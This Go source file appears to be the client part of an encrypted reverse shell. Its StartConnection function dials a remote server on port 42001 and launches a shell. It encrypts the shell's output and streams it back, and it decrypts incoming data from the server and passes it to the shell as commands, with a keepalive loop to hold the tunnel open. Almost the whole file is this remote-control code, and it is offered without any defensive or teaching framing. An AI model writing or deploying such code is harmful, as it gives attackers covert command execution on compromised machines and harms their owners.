package main

import (
	"log"
	"net"
	"time"
	"fmt"
)


func StartConnection(out chan []byte,in chan []byte){
	conn, err := net.Dial("tcp", fmt.Sprintf("%s:%s", ip, "42001"))
    if err != nil {
        log.Println("Could not connect to server to build tunnel:", err)
        return
    }
    defer conn.Close()

	go StartShell(out, in)

	go func(){ //keep the cnx alive
		for {
			time.Sleep(time.Second * 5)
			_, err := conn.Write([]byte{0x01})
			if err != nil {
				log.Println("connection to server dropped!")
				conn.Close() //TODO this will break fix it
				return
			}
		}
	}()


	go func(){
		for {
			stream := <- out
			cipher, err := Encrypt([]byte(key), string(stream))
			if err != nil {
				panic("PANIC")
			}
			_, err = conn.Write([]byte(cipher))
			if err != nil {
				log.Println("connection to server dropped!")
				conn.Close() //TODO this will break fix it
				return
			}
		}
	}()
	
	for {

		data := make([]byte, MAX_TRANSFR)
		k, err := conn.Read(data)
		if err != nil {
			log.Println("Could not read from server", err)
			conn.Close() //TODO this will break fix it
			return
		}

		text, err := Decrypt([]byte(key), string(data[:k]))
        if err != nil {
            log.Println("error decrypting", err)
            panic("PANIC")
        }

		//splt := splitByNilByte(data)

		in <- []byte(text)
		//ExecCmd(splt, outchannel)
	}
}

func splitByNilByte(b []byte) []byte{
	
	k := make([]byte, 0)
	for i:=0; i<=len(b)-1; i++{
		if b[i] != 0x00 {
			k = append(k, b[i])
		}else{
			break
		}
	}
	return k

}